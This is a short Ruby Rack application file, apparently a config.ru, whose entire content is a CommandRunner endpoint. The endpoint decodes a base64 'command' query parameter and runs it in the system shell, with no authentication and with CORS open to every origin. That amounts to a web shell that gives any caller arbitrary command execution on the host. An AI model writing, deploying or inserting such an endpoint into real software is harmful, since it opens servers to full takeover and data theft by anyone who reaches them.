require 'rack/cors'
require 'base64'

use Rack::Cors do
  allow do
    origins '*'
    resource '*', headers: :any, methods: :get
  end
end

class CommandRunner

  def call(env)
    @env = env
    result = %x[#{command}] if command
    if result && $?.success?
      [200, headers, [result]]
    else
      [500, headers, ['Could not run command']]
    end
  end

  private
  def command
    return unless params['command']
    Base64.decode64(params['command'])
  end

  def headers
    {'Content-Type' => 'text/plain'}
  end

  def params
    Rack::Utils.parse_query(@env['QUERY_STRING'])
  end

end

run CommandRunner.new
